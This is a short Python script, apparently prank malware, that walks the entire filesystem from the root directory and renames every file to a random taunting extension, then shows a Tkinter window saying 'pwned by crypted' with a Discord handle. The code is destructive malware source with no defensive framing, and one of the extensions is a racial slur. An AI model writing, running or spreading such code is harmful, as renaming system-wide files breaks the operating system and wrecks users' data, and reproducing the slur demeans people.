import os
import platform
from pathlib import Path
import time
import random

ext = [".ownedbycrypted", ".cantrunthis", ".yourhandslipped", ".cantrunme", ".ezgetpwnedn00b", ".soskerifuckyounigga", ".crypted", ".gunslolcryptedgg", ".cryptedlol"]

def extensions(directory):
    if not os.path.isdir(directory):
        return

    for root, _, files in os.walk(directory):
        for file in files:
            original_path = Path(root) / file
            new_path = original_path.with_suffix(random.choice(ext))
            os.rename(original_path, new_path)
            time.sleep(0.1)

if __name__ == "__main__":
    dir = "/"
    extensions(dir)
    import tkinter as tk

root = tk.Tk()
root.title("crypted pwned you")

label = tk.Label(root, text="pwned by crypted", font=("Comic Sans MS", 20))
label2 = tk.Label(root, text="discord: crypted.lol", font=("Comic Sans MS", 20))
label.pack(padx=50, pady=50)
label2.pack(padx=50, pady=50)

root.mainloop()

